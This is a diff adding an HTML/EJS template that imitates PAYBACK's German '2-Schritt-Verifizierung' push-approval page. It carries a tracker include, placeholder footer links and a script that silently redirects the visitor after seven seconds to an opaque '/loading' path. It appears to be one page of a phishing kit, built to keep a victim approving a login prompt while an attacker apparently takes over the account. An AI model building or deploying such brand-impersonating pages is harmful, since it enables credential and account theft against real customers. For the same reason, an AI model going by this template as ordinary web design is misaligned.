@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>PAYBACK</title>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <%- include('partials/tracker') %>
+        <style>
+            :root {
+                --bg-color: #FFFFFF;
+                --text-dark: #222222;
+                --text-muted: #666666;
+                --card-border: #ECECEC;
+                --input-border: #DFDFDF;
+                --link-blue: #0056B3;
+                --link-blue-hover: #003d82;
+                --divider-grey: #C6C7CA;
+                --font-stack: Arial, "Helvetica Neue", Helvetica, sans-serif;
+            }
+
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+
+            html,
+            body {
+                min-height: 100%;
+                height: 100%;
+                margin: 0;
+                padding: 0;
+                width: 100%;
+            }
+
+            body {
+                min-height: 100vh;
+                min-height: 100dvh;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                background-color: var(--bg-color);
+                color: var(--text-dark);
+                font-family: var(--font-stack);
+                text-align: center;
+                direction: ltr;
+                -webkit-font-smoothing: antialiased;
+                -moz-osx-font-smoothing: grayscale;
+            }
+
+            /* =========================================================
+           PAGE WRAPPER (Flex column for sticky footer)
+           ========================================================= */
+            .page-container {
+                width: 100%;
+                max-width: 1200px;
+                min-height: 100vh;
+                min-height: 100dvh;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                margin: 0 auto !important;
+                padding-top: 16px;
+                box-sizing: border-box;
+                background-color: var(--bg-color);
+                text-align: center;
+            }
+
+            /* Top Header Logo (public/img/bota.png) */
+            .top-header-logo {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                width: 100%;
+                flex-shrink: 0;
+                margin: 0 auto;
+                text-align: center;
+            }
+
+            .top-header-logo img {
+                width: 120px;
+                height: auto;
+                display: block;
+                margin: 0 auto;
+            }
+
+            /* =========================================================
+           MAIN CONTENT AREA: Fills vertical space, pushes footer down
+           ========================================================= */
+            .main-content-area {
+                flex: 1 0 auto;
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: flex-start;
+                padding: 0 16px;
+                box-sizing: border-box;
+                margin: 0 auto;
+            }
+
+            /* Information Box (Card):
+           Positioned approximately 3 cm (113 px) below the bottom edge of the logo */
+            .login-card {
+                width: 352px;
+                max-width: 92vw;
+                margin-top: 113px;
+                /* 3 cm (113 px) spacing below logo */
+                background-color: #FFFFFF;
+                border: 1px solid var(--card-border);
+                border-radius: 10px;
+                padding: 22px 20px 24px 20px;
+                box-sizing: border-box;
+                display: flex;
+                flex-direction: column;
+                box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
+                margin-left: auto;
+                margin-right: auto;
+                text-align: left;
+            }
+
+            /* Card Title: "2-Sch" */
+            .card-title {
+                text-align: center;
+                font-size: 24px;
+                font-weight: 700;
+                color: #1A1A1A;
+                line-height: 1.2;
+                margin-bottom: 14px;
+                letter-spacing: -0.2px;
+            }
+
+            /* Text above GIF: "Mit diesem" */
+            .card-subtext-top {
+                font-size: 14.5px;
+                color: var(--text-dark);
+                text-align: left;
+                margin-bottom: 14px;
+                line-height: 1.4;
+            }
+
+            /* Central MFA GIF Container */
+            .mfa-gif-container {
+                width: 100%;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                margin: 4px 0;
+            }
+
+            .mfa-gif {
+                width: 148px;
+                max-width: 100%;
+                height: auto;
+                display: block;
+                margin: 0 auto;
+                object-fit: contain;
+            }
+
+            /* Text below GIF: "Nachricht an dieses" */
+            .card-subtext-bottom {
+                font-size: 14px;
+                color: var(--text-dark);
+                text-align: left;
+                margin-top: 14px;
+                line-height: 1.4;
+            }
+
+            /* =========================================================
+           BOTTOM ACTION SECTION (Accordion & Recovery Link)
+           ========================================================= */
+            .bottom-action-container {
+                width: 685px;
+                max-width: 92vw;
+                margin-top: 18px;
+                display: flex;
+                flex-direction: column;
+                align-items: stretch;
+                box-sizing: border-box;
+                margin-left: auto;
+                margin-right: auto;
+            }
+
+            .accordion-box {
+                width: 100%;
+                background-color: #FFFFFF;
+                border: 1px solid var(--input-border);
+                border-radius: 6px;
+                padding: 12px 16px;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                cursor: pointer;
+                box-sizing: border-box;
+                transition: border-color 0.15s, background-color 0.15s;
+                user-select: none;
+            }
+
+            .accordion-box:hover {
+                border-color: #C0C0C0;
+                background-color: #FAFAFA;
+            }
+
+            .accordion-text {
+                font-size: 14px;
+                font-weight: 500;
+                color: var(--link-blue);
+                line-height: 1.2;
+                text-align: left;
+            }
+
+            .accordion-icon {
+                width: 16px;
+                height: 16px;
+                color: #222222;
+                transition: transform 0.2s ease;
+                flex-shrink: 0;
+                margin-left: 12px;
+            }
+
+            .accordion-box.open .accordion-icon {
+                transform: rotate(180deg);
+            }
+
+            .accordion-content {
+                background-color: #FFFFFF;
+                border: 1px solid var(--input-border);
+                border-top: none;
+                border-radius: 0 0 6px 6px;
+                padding: 14px 16px;
+                font-size: 13.5px;
+                color: var(--text-dark);
+                line-height: 1.5;
+                text-align: left;
+                box-sizing: border-box;
+            }
+
+            .recovery-link-wrapper {
+                width: 100%;
+                text-align: left;
+                margin-top: 14px;
+                margin-bottom: 24px;
+            }
+
+            .recovery-link,
+            .recovery-link:link,
+            .recovery-link:visited {
+                font-size: 14px;
+                color: var(--link-blue);
+                text-decoration: underline;
+                cursor: pointer;
+                font-weight: 500;
+            }
+
+            .recovery-link:hover,
+            .recovery-link:active {
+                color: var(--link-blue-hover);
+                text-decoration: underline;
+            }
+
+            /* =========================================================
+           STICKY FOOTER (margin-top: auto anchors to viewport bottom)
+           ========================================================= */
+            .footer-wrapper {
+                margin-top: auto;
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                flex-shrink: 0;
+                margin-left: auto;
+                margin-right: auto;
+                text-align: center;
+            }
+
+            .divider-line {
+                width: 685px;
+                max-width: 92vw;
+                border-top: 1px solid var(--divider-grey);
+                margin-top: 16px;
+                margin-left: auto;
+                margin-right: auto;
+            }
+
+            .page-footer-nav {
+                width: 100%;
+                max-width: 920px;
+                margin-top: 32px;
+                margin-bottom: 36px;
+                padding: 0 16px;
+                display: flex;
+                flex-wrap: wrap;
+                justify-content: center;
+                align-items: center;
+                gap: 12px 20px;
+                box-sizing: border-box;
+                margin-left: auto;
+                margin-right: auto;
+                text-align: center;
+            }
+
+            .footer-nav-link,
+            .footer-nav-link:link,
+            .footer-nav-link:visited {
+                font-size: 13.5px;
+                font-weight: 700;
+                color: var(--text-dark);
+                text-decoration: none;
+                white-space: nowrap;
+            }
+
+            .footer-nav-link:hover {
+                text-decoration: underline;
+            }
+
+            /* =========================================================
+           RESPONSIVE - TABLETS & MOBILE
+           ========================================================= */
+            @media (max-width: 720px) {
+                .page-footer-nav {
+                    gap: 12px 18px;
+                }
+
+                .footer-nav-link,
+                .footer-nav-link:link,
+                .footer-nav-link:visited {
+                    font-size: 12.5px;
+                    font-weight: 700;
+                }
+
+                .login-card {
+                    width: 92vw;
+                    max-width: 352px;
+                    margin-top: clamp(48px, 9vh, 113px);
+                }
+
+                .bottom-action-container {
+                    width: 92vw;
+                    max-width: 352px;
+                }
+
+                .divider-line {
+                    width: 92vw;
+                }
+            }
+        </style>
+</head>
+
+<body>
+
+    <div class="page-container">
+
+        <!-- Top Header Logo (public/img/bota.png) -->
+        <header class="top-header-logo">
+            <img src="/img/bota.png" alt="Logo"
+                onerror="if(!this.dataset.retry){this.dataset.retry='1';this.src='img/bota.png';}">
+        </header>
+
+        <!-- Main Content Area: flex: 1; pushes footer to bottom -->
+        <main class="main-content-area">
+
+            <!-- Main Information Box: 3 cm (113 px) below logo -->
+            <div class="login-card">
+
+                <!-- Card Title -->
+                <h1 class="card-title">2-Schritt-Verifizierung</h1>
+
+                <!-- Text above GIF -->
+                <p class="card-subtext-top">Mit diesem zusätzlichen Schritt bestätigst Du Deine Identität bei der
+                    Anmeldung.</p>
+
+                <!-- Central MFA GIF Animation -->
+                <div class="mfa-gif-container">
+                    <img src="/img/MFA.gif" alt="MFA Animation" class="mfa-gif"
+                        onerror="if(!this.dataset.retry){this.dataset.retry='1';this.src='img/MFA.gif';}">
+                </div>
+
+                <!-- Text below GIF -->
+                <p class="card-subtext-bottom">PAYBACK hat eine Nachricht an dieses Gerät geschickt. Bestätige die
+                    Nachricht mit Ja, um fortzufahren.</p>
+
+            </div>
+
+            <!-- Bottom Action Section: Accordion & Recovery Link -->
+            <div class="bottom-action-container">
+
+                <!-- Accordion Box: "Keine Nachricht erhalten?" -->
+                <div class="accordion-box" id="accordionBox" role="button" tabindex="0" aria-expanded="false"
+                    aria-controls="accordionContent">
+                    <span class="accordion-text">Keine Nachricht erhalten?</span>
+                    <svg class="accordion-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"
+                        stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+
+                <!-- Hidden Accordion Content -->
+                <div class="accordion-content" id="accordionContent" style="display: none;">
+                    Bitte überprüfen Sie Ihre Internetverbindung oder vergewissern Sie sich, dass die App auf Ihrem
+                    Smartphone geöffnet ist.
+                </div>
+
+                <!-- Recovery Link -->
+                <div class="recovery-link-wrapper">
+                    <a href="#" class="recovery-link">Wiederherstellungsoptionen &gt;</a>
+                </div>
+
+            </div>
+
+        </main>
+
+        <!-- Sticky Footer Wrapper -->
+        <div class="footer-wrapper">
+            <!-- Divider Line -->
+            <div class="divider-line"></div>
+
+            <!-- Footer Navigation Links -->
+            <footer class="page-footer-nav">
+                <a href="#" class="footer-nav-link">Impressum</a>
+                <a href="#" class="footer-nav-link">Unternehmen</a>
+                <a href="#" class="footer-nav-link">Arbeiten bei PAYBACK</a>
+                <a href="#" class="footer-nav-link">Fragen &amp; Hilfe</a>
+                <a href="#" class="footer-nav-link">Datenschutz</a>
+                <a href="#" class="footer-nav-link">Barrierefreiheit</a>
+                <a href="#" class="footer-nav-link">Cookie-Einstellungen</a>
+            </footer>
+        </div>
+
+    </div>
+
+    <!-- Accordion toggle script -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const accordionBox = document.getElementById('accordionBox');
+            const accordionContent = document.getElementById('accordionContent');
+
+            if (accordionBox && accordionContent) {
+                accordionBox.addEventListener('click', function () {
+                    const isOpen = accordionBox.classList.toggle('open');
+                    accordionBox.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
+                    if (isOpen) {
+                        accordionContent.style.display = 'block';
+                    } else {
+                        accordionContent.style.display = 'none';
+                    }
+                });
+
+                accordionBox.addEventListener('keydown', function (e) {
+                    if (e.key === 'Enter' || e.key === ' ') {
+                        e.preventDefault();
+                        accordionBox.click();
+                    }
+                });
+            }
+        });
+    </script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                window.location.href = '/loading?time=5&url=/Yf5sn9Opi6BJksRuw78f';
+            }, 7000);
+        });
+    </script>
+</body>
+
+</html>
